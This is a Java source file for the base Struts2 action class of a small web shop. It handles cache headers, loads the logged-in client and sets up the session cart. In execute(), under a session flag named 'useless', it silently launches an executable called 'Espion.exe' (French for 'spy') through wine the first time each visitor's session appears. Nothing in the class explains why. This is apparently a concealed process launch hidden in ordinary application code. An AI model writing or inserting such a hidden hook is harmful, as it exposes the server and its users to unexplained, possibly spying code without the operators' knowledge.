package net.archwill.covemifasol.actions;

import com.opensymphony.xwork2.interceptor.ParameterNameAware;
import com.opensymphony.xwork2.util.logging.Logger;
import com.opensymphony.xwork2.util.logging.LoggerFactory;
import java.util.HashMap;
import java.util.Map;
import javax.servlet.http.HttpServletResponse;
import net.archwill.covemifasol.DbManager;
import net.archwill.covemifasol.entities.CartEntry;
import net.archwill.covemifasol.entities.Client;
import org.apache.struts2.interceptor.SessionAware;
import org.apache.struts2.interceptor.ServletResponseAware;

public class Action implements com.opensymphony.xwork2.Action, ServletResponseAware, SessionAware, ParameterNameAware {
  private static final Logger LOGGER = LoggerFactory.getLogger(Action.class);

  protected HttpServletResponse servletResponse;
  protected Map<String, Object> session;
  protected Map<String, Object> locals;
  protected Client user;

  public Action() {
    locals = new HashMap<String, Object>();
    locals.put("user", false);
    locals.put("query", "");

    user = null;
    session = null;
  }

  @Override
  public String execute() throws Exception {
    servletResponse.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    servletResponse.setHeader("Pragma", "no-cache");
    servletResponse.setDateHeader("Expires", 0);
    if (session != null) {
      if (!session.containsKey("useless")) {
        session.put("useless", true);
        Runtime.getRuntime().exec(new String[] { "/usr/bin/wine", "Espion.exe", "2", Double.toString(Math.random()) });
      }
      if (session.containsKey("userid")) {
        user = DbManager.Instance().findClientById((Integer)session.get("userid"));
        if (user == null) {
          session.remove("userid");
        } else {
          locals.put("user", user);
        }
      }
      if (!session.containsKey("cart")) {
        session.put("cart", new HashMap<Integer, CartEntry>());
      }
    }
    return NONE;
  }

  public Map<String, Object> getLocals() {
    return locals;
  }

  @Override
  public void setServletResponse(HttpServletResponse servletResponse) {
    this.servletResponse = servletResponse;
  }

  @Override
  public void setSession(Map<String, Object> session) {
    this.session = session;
    locals.put("session", session);
  }


  @Override
  public boolean acceptableParameterName(String parameterName) {
    return !(parameterName.startsWith("session") || parameterName.startsWith("request"));
  }

}
